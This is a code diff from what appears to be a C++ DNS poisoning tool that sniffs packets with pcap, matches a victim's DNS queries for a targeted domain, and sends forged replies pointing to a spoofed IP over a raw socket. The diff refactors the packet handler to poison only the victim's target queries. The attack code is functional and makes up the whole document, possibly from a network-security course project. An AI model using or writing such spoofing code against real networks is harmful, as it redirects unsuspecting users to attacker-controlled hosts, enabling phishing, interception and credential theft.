@@ -13,6 +13,26 @@
 #include <fstream>
 #include <sstream>
 
+inline bool isSameMac(const unsigned char *a, const unsigned char *b) {
+    for (int i = 0; i < ETH_ALEN; i++) {
+        if (a[i] != b[i]) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
+inline bool isSameQuestion(const unsigned char *a, const unsigned char *b) {
+    for (int i = 0; a[i]; i++) {
+        if (a[i] != b[i]) {
+            return false;
+        }
+    }
+
+    return true;
+}
+
 int main(int argc, const char *argv[]) {
     // Read strings from config file
     std::unordered_map<std::string, std::string> properties = getConfig("poisoner.conf");
@@ -212,48 +232,19 @@ void dnsGotPacket(unsigned char *args, const struct pcap_pkthdr *header,
     }
 
     unsigned char *query = (unsigned char *)(packet + 14 + 20 + 8 + 12);
-    int bytesSent;
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = udp->dest;
     sin.sin_addr.s_addr = ip->saddr;
 
-    if (dns->qr == DNS_QUERY) {
-        // is it for a site we care about
-        for (int i = 0; addressFilter[i]; i++) {
-            if (addressFilter[i] != query[i]) {
-                // forward the captured packet without the ethernet header
-                bytesSent = sendto(params->rawSocket, packet + 14, header->caplen - 14, 0,
-                                   (struct sockaddr *)&sin, sizeof(sin));
-                std::cout << "forwarding packet, size: " << bytesSent << std::endl;
-                return;
-            }
-            unsigned char buffer[1500];
+    bool isTarget = isSameQuestion(addressFilter, query);
 
-            // it is for a site we care about, forge poisoned response
-            int responseSize = forgeDns(dns, &spoofIp, buffer + 20 + 8);
-
-            struct in_addr ogSrc;
-            struct in_addr ogDst;
-            ogSrc.s_addr = ntohl(ip->saddr);
-            ogDst.s_addr = ntohl(ip->daddr);
-            fillIpUdpHeader(buffer, ogDst, ogSrc, ntohs(udp->dest), ntohs(udp->source),
-                            responseSize);
-            bytesSent = sendto(params->rawSocket, buffer, 20 + 8 + responseSize, 0,
-                               (struct sockaddr *)&sin, sizeof(sin));
-            std::cout << "sending reply, size: " << bytesSent << std::endl;
-        }
-    } else if (dns->qr == DNS_RESPONSE) {
-        // is it for a site we care about
-        for (int i = 0; addressFilter[i]; i++) {
-            if (addressFilter[i] != query[i]) {
-                // forward the captured packet without the ethernet header
-                bytesSent = sendto(params->rawSocket, packet + 14, header->caplen - 14, 0,
-                                   (struct sockaddr *)&sin, sizeof(sin));
-                std::cout << "forwarding packet, size: " << bytesSent << std::endl;
-                return;
-            }
-        }
-        // if it is the real response for a site we care about just ignore it
+    if (dns->qr == DNS_QUERY && ip->saddr == params->victimIp->s_addr && isTarget) {
+        int responseSize = forgeDns(dns, &spoofIp, params->buffer + 20 + 8);
+        fillIpUdpHeader(params->buffer, ip->daddr, ip->saddr, udp->dest, udp->source,
+                        responseSize);
+        sendto(params->rawSocket, params->buffer, 20 + 8 + responseSize, 0,
+                           (struct sockaddr *)&sin, sizeof(sin));
+        std::cout << "poisoning response" << std::endl;
     }
 }
